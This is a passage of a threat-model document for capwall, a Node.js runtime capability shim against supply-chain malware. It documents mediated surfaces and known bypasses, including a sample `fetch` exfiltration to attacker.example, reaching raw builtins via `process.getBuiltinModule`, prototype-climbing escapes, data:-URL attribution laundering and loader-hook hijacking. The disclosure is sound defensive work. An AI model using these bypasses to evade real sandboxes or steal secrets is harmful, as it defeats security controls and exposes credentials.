# capwall threat model

This document is the source of truth for **what capwall protects against and what it does
not.** Read it before relying on capwall. If you change the engine, keep this document in
sync — overclaiming here is a security bug.

## One-sentence summary

capwall is **pragmatic, runtime, per-package defense-in-depth against opportunistic
supply-chain malware.** It is **not** a formal sandbox and does not withstand a determined
in-process attacker.

## Implementation status (keep in sync with the roadmap)

As of roadmap **M5**, all core capability surfaces are mediated on **both the CJS `require`
path and the ESM `import` path**: `fs`, `net`/`http`/`https`/`tls`/`http2`/`dgram`,
`child_process`, `worker_threads`, `vm`, and `process.env`. ESM interception uses a
`module.register()` loader hook (`loader/esm-hook.ts` + `esm-hooks.ts` + `esm-runtime.ts`)
that rewrites mediated builtin specifiers to a synthetic module re-exporting the same shims
the CJS path uses; it covers **static AND dynamic** `import` (`import { readFile } from
"node:fs"` and `await import("node:fs")`), attributing to the importing package exactly like
CJS. It is **on by default** under the CLI preload (disable with `CAPWALL_ESM=0`).

Interception is decided on the URL a specifier **resolves to**, not on the specifier string
(#59). A specifier does not have to *name* a builtin to reach one — Node's subpath imports let
a package map a private `#…` specifier onto a bare builtin in its own `package.json`
(`"imports": { "#x": "fs" }`; bare targets work, `"node:fs"` targets Node rejects outright),
and conditional and `*`-pattern targets do the same. Classifying on the resolved URL covers
every such spelling at once, including ones nobody has enumerated yet. Verified mediated after
the fix: bare / conditional / `*`-pattern imports targets, `fs/promises` targets,
self-referencing package exports, `data:` URL re-exports and `import.meta.resolve`. The only
probed route still reaching a raw builtin is `process.getBuiltinModule` — the pre-existing,
path-independent residual listed under "what capwall does NOT stop", which defeats the CJS
patch identically and is not ESM-specific.

The shims are handed out **mutable by default** (so `graceful-fs` and friends keep working);
`install(policy, mode, { hardened: true })` / `CAPWALL_HARDENED=1` freezes them instead —
**off by default**, see § Hardened mode for what that does and does not buy.

**ESM known limits** (documented, not silent):
- A module that captured a raw builtin **before** capwall installed is not re-bound (same as
  CJS — install via the `--import` preload so capwall registers first).
- The set of mediated specifiers is fixed at install time; a mediated builtin not in the shim
  registry is not intercepted (the registry covers the capabilities above).
- Unregistering the ESM hook is best-effort (Node cannot fully remove a registered hook), so
  teardown is **fail-closed rather than reversible**: there is no way to un-bind an ESM import,
  and "capwall is off again" is not on the menu. A mediated builtin **not yet imported** when
  `uninstall()` ran throws an explicit "capwall is no longer installed" error on re-import; one
  that a module **had already imported** keeps the shim it captured, and that shim now denies
  under a deny-all policy rather than continuing to serve the torn-down install's grants (#62 —
  before that fix it kept serving them, so this bullet previously overclaimed: it was true only
  for never-imported specifiers).
- **The first install no longer wins.** A synthetic module resolves its shim once, at
  evaluation, and ESM module caching is per-process and permanent, so an already-imported
  specifier used to be pinned to the policy of the install that was active when it was first
  imported — making `uninstall()` + `install(tighter)` a silent no-op on the import path
  (fail-open with respect to the new policy). The ESM shims now read the live install's policy
  on every call, so a runtime policy swap applies to already-imported specifiers in both
  directions. This is not dependency-reachable; it mattered for embedders swapping policy at
  runtime and for programmatic tests.
- **capwall cannot guarantee it stays outermost in the loader-hook chain** (#61). See
  "Loader-hook registration" below — this is the significant residual on the ESM path.
- `process.env` is not import-routed; its Proxy guard (installed by `install()`) covers both
  module systems already.

**Loader-hook registration (#61) — partially closed, residual named.** Node's module
customization hooks are deliberately composable: the **most recently registered hook runs
first**, and the synchronous `module.registerHooks()` chain runs entirely ahead of the
asynchronous `module.register()` chain capwall lives in. A dependency that reaches
`register`/`registerHooks` can therefore short-circuit a mediated specifier straight to the
real `node:` URL before capwall's `resolve` is consulted — and because the hook is
process-wide and the ESM cache is keyed by resolved URL, that de-mediates **every** package
loaded afterwards, not just the attacker: an innocent third dependency's ordinary
`import * as fs from "node:fs"` binds to the raw builtin, with no log line.

What capwall does about it: `node:module` is mediated, and `register`/`registerHooks` are
treated as **application-only**. A registration attributed to a dependency is refused with a
`CapabilityError` in `enforce`, and warned about loudly in `observe` (which by contract never
blocks). `CAPWALL_ALLOW_LOADER_HOOKS=1` permits it, still warning, for a tree where a
dependency legitimately installs a loader. Everything else on `node:module` passes through
untouched, so the application's own tooling (`tsx`, `ts-node`, a custom loader) is unaffected —
the app is the trust root.

What it does **not** do, plainly:

- It gates *reaching* the API through a mediated module, not the API itself.
  `process.getBuiltinModule("node:module")` hands over the real one and defeats this exactly as
  it defeats every other shim.
- The gate allows `<app>`, so it inherits whatever attribution fails open to. The `data:` URL
  escape tracked as **#60** walks past it exactly as it walks past the `process.env` and
  `dgram` gates (verified). That is one bug in attribution, not three in the gates.
- A hook registered **before** capwall installs is already ahead of it.
- capwall does **not** re-assert first position after an allowed registration. It could — the
  synchronous chain can be rejoined — but that would silently override the application's own
  loader tooling, and it still would not beat a hook that short-circuits `load` as well as
  `resolve`, which nothing in-process can.
- As defense in depth the `load` hook **re-mediates** any raw `node:<mediated>` URL it is
  handed and warns once per specifier, since capwall's own `resolve` never emits one. Measured
  reach, so this is not read as more than it is: a `node:` URL already resident in the ESM
  module cache is served from cache and the load chain is never consulted — and capwall's own
  shims capture their real modules with a static ESM `import`, so every mediated builtin is
  already cached raw before the hook registers. Today this branch is therefore a **latent**
  backstop for the mediated set, active only for specifiers capwall does not itself import and
  for resolution routes a future Node might add. Capturing the real modules through
  `createRequire()` would make it active for the whole set (a CJS `require` does not populate
  the ESM cache — verified); that is follow-up work, not something this change claims.

Net: a dependency doing this opportunistically is now stopped and logged. A dependency that
knows about capwall has routes left. Treat ESM mediation as effective against packages that do
not go looking for the loader chain.

Per-capability notes:

- **`fs`** — path-taking read/write families (sync, callback, `fs.promises`) plus the
  path-taking stream constructors (`ReadStream`/`WriteStream` and their `File*Stream`
  aliases, guarded as **guarded subclasses** — see "Capability-bearing classes" below).
  Purely fd-based operations (`fs.read`, `fs.write`, `ftruncate`, …) are not
  mediated — consistent with the fd-escape exclusion below.
- **`net`/`http`/`https`/`tls`/`http2`/`dgram`** — **egress only**. Mediated: `net.connect`/
  `createConnection` **and** `new net.Socket().connect()`; `http(s).request`/`get` **and**
  `new http.ClientRequest()`; `http(s).Agent#createConnection`, on both a caller-built agent and
  the pre-built `http(s).globalAgent` **instance** (#65 — see "Capability-bearing instances"
  below); `tls.connect` and `new tls.TLSSocket().connect()`;
  `http2.connect`; and `dgram` socket `send`/`connect` (UDP). Each core egress module is
  shimmed separately on purpose: capwall's require patch only affects `Module._load`-routed
  requires (user/dependency code); Node's own HTTP client loads `net` through the internal
  bootstrap loader, which never hits `Module._load`, so one module's shim never covers
  another — and a dependency could otherwise bypass the control simply by choosing `tls`
  (or `dgram`) over `net`. Inbound `server.listen` is not gated (capwall mediates who a
  package may *reach*, not that it may serve). IPC/unix-socket connects have no host:port and
  are approximated coarsely as `{ host: "<ipc>", port: 0 }`. `dgram` ops attributed to `<app>`
  are not gated (the app is the trust root, as for `process.env`); since #60 that requires a
  positively identified application frame, and Node's auto-bind `send` replay — which used to
  ride on the old fail-open, because Node re-invokes `send` from the socket's `'listening'`
  event on a stack with no caller frame — is handled by state instead: the already-authorized
  send is forwarded with the real method shadowing the guard, so the replay cannot re-enter it.
  Capability-bearing classes
  (`net.Socket`, `tls.TLSSocket`, `http.ClientRequest`, `http.Agent`, `dgram.Socket`) are
  guarded via a **guarded subclass** whose prototype method (or constructor) runs the check,
  so `new Cls()`, `(instance).constructor`, `Cls.prototype.constructor`, and
  `Cls.prototype.method.call(...)` are all covered (a construct-trap Proxy would not be — see
  "Capability-bearing classes" below). The pre-built `http(s).globalAgent` **instances** are
  guarded too, as of #65 — before that fix they were live `Agent` objects the shim copied
  through verbatim, so `http.globalAgent.createConnection({host, port})` opened a socket with no
  check and, worse, **no recorded decision**: `observe` and `capwall diff` could not see it
  either. See "Capability-bearing instances" below. The getter-based TOCTOU tracked as #26 and
  #56 — a package with a narrow net grant supplying an options object (or a `URL` instance)
  whose destination-deciding fields were accessor properties returning the granted value when
  capwall derived the guarded target and a different value when Node itself re-read them — is
  **closed**, with the guarantee scoped as follows.

  capwall never forwards a caller's options object or `URL`. It reads each destination-deciding
  field exactly once — `host`/`hostname`/`port`/`path` for `net`/`tls`/`http2` options,
  `host`/`hostname`/`port`/`socketPath`/`defaultPort` for `http(s)` options, and the nine URL
  fields Node's `urlToHttpOptions` derives — and forwards a clone carrying those single reads as
  plain data properties, or (for a `URL`) a synthesized options object / authority string built
  from that one snapshot. **Every** own accessor on a forwarded object is additionally flattened
  to a value during the clone, on every key, not just the listed ones. So the object Node reads
  contains no getters at all: for the fields above, Node observes exactly the value that was
  guarded; for any other field, Node observes a value that cannot change between reads. #56 was
  the case that motivated the second rule — `path` (the unix-socket destination) was not on the
  first version's list, so its accessor rode into the clone live, and a package granted one TCP
  endpoint could reach an arbitrary unix socket by returning `undefined` on the read capwall saw
  and `/var/run/docker.sock` on the read Node made.

  **Still open, deliberately.** (a) IPC is modelled COARSELY: every unix-socket/named-pipe
  connect is the single pseudo-target `<ipc>:0`, so a package granted `<ipc>` may reach **any**
  local socket, not the one it was observed using. Granting `<ipc>` is close to granting local
  IPC wholesale — review it as such. (b) `options.createConnection` (`http(s)`/`http2`) lets the
  caller supply the function that opens the socket; capwall guards the target it derived, but a
  function that ignores its options and dials elsewhere is only re-gated if the module it uses
  to dial is itself capwall-mediated — the same class as the pre-install capture residual below.
  (c) `dns` lookups are not mediated (a lookup moves no payload; DNS tunneling is a
  determined-attacker technique out of scope), so a granted host name resolving to an attacker's
  address is not caught here. (d) Reaching the real prototype by climbing past the guard — two
  levels from an instance of a guarded class
  (`Object.getPrototypeOf(Object.getPrototypeOf(sock)).connect`), equivalently one hop from the
  class object (`net.Socket.prototype.__proto__.connect`), or one hop from a guarded *instance*
  view (`Object.getPrototypeOf(http.globalAgent).createConnection.call(agent, opts)`) — the same
  class as the general shim un-patching residual, in-process code deliberately climbing above the
  guard. These are documented residuals, not silent gaps.

  An IPv6 literal is guarded, recorded, and matched **unbracketed** (`::1`, the form Node
  dials); see `docs/policy-format.md`.
- **`child_process`, `worker_threads`, `vm`** — boolean **gates** (may this package spawn /
  start a worker / use `vm` at all). Gating, not confinement: capwall does not constrain what
  the subprocess/worker/vm-context does once started (see § gating vs confinement). The
  capability-bearing classes on these surfaces — `child_process.ChildProcess`,
  `worker_threads.Worker`, `vm.Script`, and (only when `--experimental-vm-modules` makes them
  exist) `vm.SourceTextModule`/`vm.SyntheticModule` — are guarded subclasses, so the class is
  gated as well as the module function.
- **`process.env`** — a read allowlist enforced via a `Proxy` on `process.env` (`get` **and**
  `getOwnPropertyDescriptor` traps, so `Object.getOwnPropertyDescriptor(process.env, k).value`
  cannot leak a value a direct read denies). Reads attributed to `<app>` pass through ungated
  — the app is the trust root — but that means a **positively identified application source
  file on the stack**, and nothing else. A read capwall cannot attribute is `<unknown>` and is
  gated exactly like a dependency's (see § attribution outcomes). `CAPWALL_*` keys (capwall's
  own preload plumbing) are never gated or recorded. When a package **spawns a child**, Node
  reads `process.env` to build the child's environment block; those reads are exempted (the
  child_process shim suspends the env gate around the spawn) so an allowed spawn inherits a
  real environment rather than an empty one. A denied env read is a **soft deny**: it returns
  `undefined` (hiding the value) rather than throwing, so a benign dependency probing an
  optional var is not crashed. The denial is still recorded and logged. **Key NAMES stay
  enumerable** to a denied dependency (`Object.keys`, `in`, `for..in`); only VALUES are hidden
  — names are not the secret, and hiding them would break feature-detection.

  **Name-level vs value-level (#67).** The gate applies to *values*, and only value-yielding
  operations are recorded. Everything that hands a dependency a value goes through `[[Get]]` —
  `env.K`, destructuring, `JSON.stringify(env)`, `{...env}`, `Object.entries`/`Object.values` —
  and is gated **and** written to the trace. Name-level operations — `in`, `Object.keys`,
  `for..in`, `Object.getOwnPropertyNames` — are neither gated nor recorded. The
  `getOwnPropertyDescriptor` trap straddles both: `Object.keys` and `for..in` call it once per
  key just to read `[[Enumerable]]`, and it cannot distinguish that from a genuine descriptor
  read (identical arguments, identical caller stack). It therefore **hides** the value for a
  denied key (unconditionally — that is the security property) but does **not record**.
  *Residual:* a `getOwnPropertyDescriptor(env, k).value` read attempt is blocked but no longer
  appears in the audit trail. Recording it instead would log every `for..in` as a value read of
  every key in the environment, which made `observe` output a property of the host machine
  rather than of the package and printed `DENY '<pkg>' env:AWS_SECRET_ACCESS_KEY` for mere
  enumeration. The available discriminators (an `ownKeys`-primed "enumeration epoch" heuristic;
  returning an accessor descriptor so only an explicit `desc.get()` records) are spoofable by
  the attacker they target or catch only an attacker who has already adapted to capwall, and a
  spoofable heuristic inside the anti-exfiltration control is worse than a documented gap.

  **Writes are NOT mediated (#66).** `env` grants are a *read* allowlist; a dependency may set,
  delete, and `defineProperty` on `process.env` freely, exactly as un-shimmed. The proxy's `set`
  trap exists only to restore ordinary assignment semantics — without it, assignment to an
  already-set key crashed the host app with `ERR_INVALID_OBJECT_DEFINE_PROPERTY`. *Residual:* a
  dependency can set `NODE_OPTIONS`, `LD_PRELOAD`, `NODE_EXTRA_CA_CERTS` or proxy variables to
  influence other code. In-process this is largely inert (`NODE_OPTIONS` is consumed at startup,
  before any dependency runs); its payoff is in a **child process**, and spawning is already a
  gated capability, so the spawn is the control point. A proxy variable that redirects egress is
  still subject to the `net` gate, which guards the target actually connected to. Gating writes
  would require write-grant vocabulary the policy language does not have, and soft deny does not
  compose with writes (a silently dropped write leaves the dependency believing it succeeded; a
  throwing write reintroduces the crash). Tracked as a policy-language question, not a bug.

**Capability-bearing classes are guarded subclasses, not Proxies.** Where a capability can be
reached through a class rather than a module function, capwall replaces the class with a
**subclass it owns**, whose constructor (or prototype method) runs the check before delegating,
plus a `Symbol.hasInstance` override so `instanceof` still answers correctly for instances
built by the real builtin's own factories. That covers `fs.ReadStream`/`WriteStream` (and the
`File*Stream` aliases), `vm.Script`/`SourceTextModule`/`SyntheticModule`,
`worker_threads.Worker`, `net.Socket`, `tls.TLSSocket`, `http(s).ClientRequest`,
`http(s).Agent`, `dgram.Socket`, and `child_process.ChildProcess`.

**Capability-bearing instances are guarded views (#65).** A builtin namespace does not only
export functions and classes — it can export a live, pre-built **instance** that already carries
the capability, and each shim's namespace-copy loop duplicated those through with their real
methods intact. `http.globalAgent`/`https.globalAgent` were exactly that: any dependency could
call `http.globalAgent.createConnection({host, port})` and connect under a deny-all `enforce`
policy, with **no log line** — the unlogged part being the worse half, since egress is the
payload step of the attack class capwall exists to contain and `observe`/`capwall diff` could
not surface it. Both are now wrapped in a guarded **view**: a `Proxy` that forwards every read
and write to the one real agent (so the shared, process-global connection pool, `maxSockets`,
keep-alive, `agent.sockets` and `instanceof` all keep working — `globalAgent` is on the default
path for nearly every HTTP call) and replaces only `createConnection`, which is gated with the
same resolver the guarded `Agent` subclass uses.

A `Proxy` is the right tool *here* and remains the wrong one for a class: the #64 objection is
that a proxied class's `.prototype.constructor` is the real class, and an instance has no
`.prototype` to leak through. The alternatives were worse — a freshly constructed guarded agent
would be a *different* pool (so `http.globalAgent.maxSockets = N` would silently stop affecting
real requests), and patching the real instance's method would mutate a **process-global that
outlives `uninstall()`**, which is the same constraint that keeps real builtins unfrozen.

The audit behind #65 walked every object-valued export of every shimmed namespace on Node 20 and
22. `http.globalAgent` and `https.globalAgent` were the only capability-bearing ones; the rest
are inert data (`fs.constants`, `http.METHODS`, `http.STATUS_CODES`, `tls.rootCertificates`,
`http2.constants`, `vm.constants`, `worker_threads.resourceLimits`) or an already-shimmed
sub-namespace (`fs.promises`).

**Global egress surfaces are NOT mediated, and are not claimed to be.** capwall intercepts
*module* surfaces — what `require`/`import` hands back. Node's built-in global egress APIs never
route through a module load, so they are outside the mechanism entirely: `globalThis.fetch`,
`globalThis.WebSocket` (and `http.WebSocket`, which on Node ≥22 is the same object re-exported
onto the `http` namespace — shimming that copy alone would buy nothing), and `EventSource`. A
dependency that calls `fetch("https://attacker.example/", {method:"POST", body: secret})` is
neither gated nor logged. This is a real gap in egress coverage, not a determined-attacker
residual: it needs no reflection and no knowledge of capwall. Until it is closed, treat capwall's
egress control as covering the `net`/`http`/`https`/`tls`/`http2`/`dgram` module surfaces only,
and pair it with network-level egress control (container/OS firewall) if the global APIs matter
to your threat model.

The earlier approach for some of those sites was a construct-trap `Proxy`, which **did not
hold**: a `Proxy` forwards property reads to its target, so the proxied class's `.prototype`
is the real prototype and `Cls.prototype.constructor` is the real, unguarded class. A single
line — `new (fs.ReadStream.prototype.constructor)(deniedPath)` — read any file, evaluated any
code (`vm.Script`), or spawned a worker (`worker_threads.Worker`) with the guard never firing.
The worker case was the worst of the three, because a worker is a fresh Node context with none
of capwall's shims in it. All such sites are now subclasses, and a regression test asserts the
`.prototype.constructor` invariant over **every** guarded class in the codebase (issue #64).
A second benefit of that conversion: a subclass is an object capwall owns, so opt-in hardened
mode (#17) can freeze it — a `Proxy` could not be frozen without freezing the real builtin
class it wraps.

**Residual, unchanged:** climbing PAST the guarded subclass still reaches the real method or
class — `Object.getPrototypeOf(fs.ReadStream.prototype).constructor` from the class object, or
two prototype levels up from an instance. That is the same class of escape as un-patching a
shim outright: in-process code deliberately climbing above the guard. capwall does not claim to
stop it. A guarded subclass raises the cost of the accidental and the opportunistic walk; it is
not a boundary.

**Attribution outcomes: `<pkg>`, `<app>`, `<unknown>`.** Every mediated call is charged to one
of three principals. A frame under `node_modules/<pkg>` charges that package. A real source
file **not** under `node_modules` charges `<app>`, the trust root, which the `process.env` and
`dgram` gates exempt. Everything else — no qualifying frame on the stack at all, or app code
reached only *through* code with no filesystem identity (a `data:`/`blob:` module, `eval`
output with no trustworthy origin, a bundler `//# sourceURL=`, `node -e`/stdin) — charges
`<unknown>`.

`<unknown>` is an ordinary principal, not an exemption: deny-by-default in `enforce`, recorded
in `observe`, and grantable with an explicit `"<unknown>"` entry in `capabilities.json`. That
entry is the **escape hatch**, and it is needed in practice: Node's own ESM loader reads
`process.env.WATCH_REPORT_DEPENDENCIES` from a stack with no caller frame, so every run under
the CLI produces one unattributable env read. `capwall observe` emits the corresponding grant
automatically. Granting `<unknown>` broadly (`"env": ["*"]`, a wide `net` grant) hands that
authority to **every** call capwall cannot attribute, including a dependency deliberately
running from a `data:` module — so the preload prints a one-line warning at startup when a
policy grants it. Keep the grant as narrow as the observed keys.

Before this split (issue #60), "could not attribute" and "this is the app" were the same value.
See the § attribution laundering residual for what that cost and what remains.

**Behavior change vs. real `fs` (operational note).** In `enforce` mode a denial is delivered
via the SAME channel the real `fs` API would use for that call, not always a synchronous
throw — chosen specifically so idiomatic (try/catch-free) code is not crashed by an uncaught
exception it would never see from real `fs`:

- **`*Sync` methods** (`readFileSync`, …) throw `CapabilityError` synchronously — matches
  real sync `fs`.
- **`fs.promises` methods** reject with `CapabilityError` — matches the real promise API.
- **Callback-style async methods** (`readFile`, `mkdir`, `access`, `rm`, …) invoke the
  caller's own callback as `cb(err)` on `process.nextTick`, exactly as a real async `fs`
  error would arrive, instead of throwing. If the call is missing a callback (a mis-call),
  the shim falls back to a synchronous throw, matching real Node's behavior for the same
  mis-call.
- **`createReadStream`/`createWriteStream`** return a minimal stream (with `.path` set) that
  holds the `CapabilityError` and emits `'error'` with it **as soon as an `'error'` listener
  is attached** to the stream — not on a fixed timer — so a handler attached synchronously,
  on a microtask, on `setImmediate`, or on `setTimeout(0)` is always caught (fix #40; this
  closes the earlier parity gap, where a fixed `setImmediate` delivery could fire before a
  handler attached on a later macrotask, producing an uncaught `'error'` even though the
  consumer did handle errors). A sync throw here would still be a bypass-shaped surprise,
  since `fs.createReadStream(p).on('error', h)` is the idiomatic pattern and never throws
  synchronously in real Node either. If `'error'` is never listened for at all, a safety net
  still delivers the denial after two event-loop phases, so an unhandled denial ultimately
  crashes the process — same as real `fs` would for an unhandled async error — rather than
  silently hanging forever. This is **fail-closed** either way — the read/write never happens.
- **`watch`/`watchFile`** and the `ReadStream`/`WriteStream` **class constructors**
  (`new fs.ReadStream(deniedPath)`) throw synchronously on denial. `fs.watch` and a real
  stream constructor also throw synchronously on a bad argument, so those match. `fs.watchFile`
  is the exception: real `watchFile` does NOT throw (it calls its listener with zeroed stats),
  so the shim's sync throw there is a deliberate loud-failure choice — `watchFile`'s listener
  is `(curr, prev)`, not error-first, so there is no faithful channel to deliver the denial
  through.
- **Buffer path arguments** are decoded with `latin1` (byte-exact — fix #19) before the policy
  check, so the checked path matches the bytes forwarded to real `fs` even for non-UTF-8
  bytes. Trade-off: a **valid non-ASCII UTF-8 path passed as a Buffer** decodes to a different
  (latin1) string than the UTF-8 string a policy glob is authored in, so it may **false-deny**
  (fail-closed — never a false-allow). Uncommon (needs a non-ASCII filename supplied as a
  Buffer); the encoding strategy is tracked for reconsideration (issue).
- **`exists`/`existsSync`** remain the bespoke non-throwing existence probes: a denial reads
  as "does not exist" (`false` / `cb(false)`), never an error at all.

This is unchanged in spirit from before — enforce mode still fails loudly and a policy gap
still surfaces as a real error, not a silent allow — only the DELIVERY CHANNEL now matches
what the real `fs` API would use for that call shape. This is most likely to matter during
the observe→tighten→enforce rollout while a policy is still incomplete; run `observe` until
coverage is stable before flipping to `enforce`. Path matching is POSIX-oriented
(`/`-separated); Windows drive-letter paths are not matched by relative grants yet.

## Adversary we are designed to stop

**Opportunistic, worm-style supply-chain malware** delivered through a compromised npm
dependency. Concretely, the class exemplified by:

- **Shai-Hulud** (Nov 2025) — a self-propagating npm worm.
- **Glassworm** (2026) — malware that runs at **both** the lifecycle-script (install) phase
  **and** the application-runtime phase.

The critical observation: these payloads execute at **application runtime**, not only at
install. Install-time defenses — lockfile pinning, `--ignore-scripts`, registry scanners,
socket brokers — never see the runtime phase, where credential theft, wallet drain, and
lateral movement actually happen. capwall lives in the running process and mediates that
phase.

Such malware is typically **opportunistic**: it tries to read `process.env`, open a socket
to an exfiltration host, spawn a shell, or write to a persistence path. It does **not** go
out of its way to break out of a capability shim. That is exactly the behavior capwall's
per-package capability policy catches: a logger that suddenly opens a network socket, or a
string-formatting helper that reads environment secrets, is a policy violation.

## What capwall stops

When a package's declared capabilities are tight, capwall denies (in `enforce` mode) or logs
(in `observe` mode) attempts by that package to:

- Read/write files outside its allowed path globs (`fs`).
- Open network connections to hosts/ports outside its allowlist **through the `net`, `http(s)`,
  `tls`, `http2` and `dgram` module surfaces**. Node's global egress APIs (`fetch`, `WebSocket`)
  are *not* mediated — see "Global egress surfaces" above.
- Spawn subprocesses when `child_process` is not permitted (**gating** the spawn).
- Spin up `worker_threads` when not permitted.
- Read `process.env` keys outside its allowlist (e.g. exfiltrating `AWS_SECRET_ACCESS_KEY`
  from a package with no reason to see it).
- Use `vm` when not permitted.

The **trace→policy DX** makes those policies practical to author: run once in `observe`,
emit a starter policy scoped to what each package *actually* did, tighten it, enforce.

## What capwall does NOT stop (out of scope for confinement)

capwall does **not** harden JavaScript primordials (that is SES's job — see below). Without
frozen primordials, a **determined in-process attacker** can defeat it via, among others:

- **Prototype pollution** and **shared mutable primordials** — mutating
  `Object.prototype`/`Array.prototype`/etc. to influence code in other packages, or to
  tamper with capwall's own bookkeeping.
- **Un-patching the shims** — reaching for the original, un-wrapped core module reference and
  calling it directly. This is **cheap, not exotic**: capwall returns a plain, mutable shim
  object (deliberately un-frozen, so legitimate `fs` monkey-patchers such as `graceful-fs`
  keep working — the no-SES-tax tradeoff). A dependency can reassign the shim's methods, or
  reach the raw builtin through channels capwall does not mediate. Both the CJS `require` and
  the ESM `import` paths ARE mediated (M4/M5), so `require("node:fs")` and
  `import … from "node:fs"` both return the shim — but capwall does not chase every reflective
  escape hatch, and at least one is a **plain public API**: `process.getBuiltinModule("node:fs")`
  (Node ≥22) returns the real, un-shimmed module, as does `process.binding`, internal module
  caches, or a builtin loaded from a context capwall has not patched. `getBuiltinModule` is
  path-independent (it defeats the CJS patch identically), so this is not specific to ESM. The
  shim is a **shared, process-wide singleton**, so a single dependency that does un-patch it
  **silently disables enforcement for every other package and the app**, not just for itself,
  with no log line. Treat capwall's mediation as effective only against packages that do not
  go looking for the raw builtin. **Opt-in hardened mode (#17) closes the reassignment half of
  this** — see § Hardened mode below for exactly how much, and how little, that buys. It does
  nothing about `getBuiltinModule` and the other raw-builtin paths in this bullet. On the ESM
  path specifically, **hijacking the loader-hook chain** is a second route with the same
  disables-it-for-everyone property; it is now gated and logged rather than silent, but not
  closed — see "Loader-hook registration (#61)" above for exactly what remains.
- **Global egress APIs** — `fetch`, `WebSocket` and friends are globals, not module exports, so
  the loader-interception mechanism never sees them. See "Global egress surfaces" above; this
  one is cheap for an attacker, unlike most entries on this list.
- **fd / symlink escapes** — using an already-open file descriptor, or a symlink, to reach a
  path outside the allowed globs.
- **`vm` / `eval` / `node:sqlite`** and similar reflective or alternate-execution surfaces
  that can sidestep the shimmed API. Note the narrower claim since #60: code compiled with
  `eval`/`new Function` no longer escapes *attribution* — V8 reports where it was compiled, so
  it is charged to the compiling package, and code capwall cannot place is `<unknown>` rather
  than `<app>`. What these surfaces still buy an attacker is reaching APIs capwall does not
  mediate at all, and (with a `vm` grant) choosing the filename its frames report.
- **Attribution laundering** — capwall attributes each call to the **nearest** package frame
  on the stack (see `core/src/attribution`). A malicious package that arranges for its
  operation to be *executed by* a trusted helper's code (passing a path to a logger that
  writes it, scheduling work a broadly-granted package performs) is charged to the helper.
  Keep helper grants tight; broad grants are laundering targets.

  **What is now closed (issue #60).** This entry used to describe the whole risk, and it was
  wrong: laundering did not require a trusted helper at all. The walk discarded every frame
  with no filesystem path and then fell off the end into `<app>` — so "capwall could not work
  out whose code this is" and "this is the application" were one value, and `<app>` is exempt
  from the `process.env` and `dgram` gates. A dependency reached that state with ~15 lines of
  ordinary ESM: run the payload from a `data:` URL module (no path on any frame) and detach one
  tick through a timer (V8's async stack traces keep the dependency on the stack if it `await`s
  straight through, so the detachment was the essential part). It could then read any
  `process.env` key and send UDP **with no log line at all**, because the `<app>` short-circuit
  returned before `evaluate()`/`onDecision()`. `eval`, `new Function`, and — needing neither
  `data:` nor `eval` — handing a native function to a timer (`setTimeout(Object.assign, 0,
  stash, process.env)`, `setTimeout(sock.send.bind(sock), …)`) all reached the same state. That
  was a fail-open in exactly the Shai-Hulud shape capwall exists to stop, and it is fixed at
  the attribution layer, so all of those vectors close together: an unattributable call is now
  `<unknown>` and is evaluated like any other principal.

  **What remains.** Nearest-package is still nearest-package, so a dependency can still route
  work through a broadly-granted helper (including the app itself) and be charged to it. It can
  still **deliberately deepen or launder its own stack** — push its frame past the frame budget,
  or arrange for another package's frame to be the nearest one — and a `vm` grant lets it name
  any file it likes (`vm.runInThisContext(code, { filename: "…/node_modules/lodash/x.js" })`
  produces frames that attribute to `lodash`). A file that is not under any `node_modules` is
  `<app>` regardless of where it lives, so a dependency that can write a file **and** load it
  (`require("/tmp/x.js")`) is charged to the app; the fs write is itself gated, but a dependency
  with any write grant plus load is an escalation path. And granting `<unknown>` broadly in a
  policy restores an exemption for every unattributable call by hand. These are the
  determined-in-process-attacker class, same as un-patching the shims — real, and not papered
  over.
- **Deep stacks past the attribution frame budget** — the walk inspects at most `maxFrames`
  frames (default 25). When the owning dependency's frame is deeper (long promise chains,
  dynamically-compiled or deeply-nested wrappers, `async_hooks`-heavy frameworks), the walk
  runs out of budget without finding it. That used to fall back to `<app>`, the trust root,
  which could **wrongly allow** the call; since #60 it falls back to `<unknown>`, so it is
  denied by default in enforce instead — a capped attribution now fails closed, including on
  the `process.env` and `dgram` paths that exempt `<app>`. The trade is the other direction:
  a benign deep stack is **wrongly denied** rather than wrongly allowed. Mitigation: the budget
  is configurable — `CAPWALL_MAX_FRAMES` for the preload/CLI, `install(…, { attribution: {
  maxFrames } })` in-process — and an exhausted walk is **flagged, not silent** (the decision
  carries `attributionTruncated: true`; the preload warns once on stderr), so the fix is to
  raise the budget rather than to grant `<unknown>`. This is still a **mitigation, not a fix**:
  a dependency can deliberately deepen its own stack past whatever budget is configured, which
  now costs it its grants rather than gaining it the app's. Raising the budget costs throughput
  on every mediated call (issue #15).
- **Native `.node` addons** — arbitrary compiled code; capwall can gate *whether* an addon
  loads but cannot confine what it does once loaded.
- **Subprocess internals** — capwall can gate *whether* a `child_process` spawn happens, but
  once a child process runs it is outside capwall's process and outside its confinement.

**Gating vs confinement.** For native addons and subprocesses, capwall provides **gating**
(a policy decision about whether they are allowed to start) but **not confinement** (control
over what they do after starting). Do not treat a gated-but-allowed addon or subprocess as
confined.

## Hardened mode (opt-in, off by default) — issue #17

`install(policy, mode, { hardened: true })`, or `CAPWALL_HARDENED=1` for the CLI preload,
freezes the capability surfaces capwall hands to dependencies. It exists because the default
shim is a plain mutable object, so `fs.readFileSync = evil` is a one-line, un-logged removal
of enforcement **for the whole process** (the un-patching bullet above). Hardened mode is
**off by default and must stay off by default** — see the graceful-fs cost below.

**What it freezes** (only objects capwall itself created — never a builtin):

- Every shim **namespace** handed to a dependency: `fs`, `fs.promises`, `net`, `http`,
  `https`, `tls`, `http2`, `dgram`, `child_process`, `worker_threads`, `vm`. So
  `fs.readFileSync = evil`, `delete fs.readFileSync`, and
  `Object.defineProperty(fs, "readFileSync", …)` all fail.
- Every guarded **wrapper function** on those namespaces, including wrappers hanging off
  other wrappers (`fs.realpath.native`).
- Every guarded **class in every shim — and its prototype**. That is the complete set from
  "Capability-bearing classes" above: the prototype-method sites (`net.Socket`,
  `tls.TLSSocket`, `http(s).Agent`, `dgram.Socket`, `child_process.ChildProcess`) and the
  constructor sites (`fs.ReadStream`/`WriteStream` + their `File*Stream` aliases,
  `vm.Script`/`SourceTextModule`/`SyntheticModule`, `worker_threads.Worker`,
  `http(s).ClientRequest`). The prototype freeze is what matters for the method sites:
  `net.Socket.prototype.connect = evil` is otherwise the same one-line un-guard, one level
  down. Freezing a guarded class does **not** stop `class Mine extends fs.ReadStream {}` —
  that reads the frozen class and writes to a new one.
- The guarded `send`/`connect` own-properties capwall installs on a `dgram` socket instance
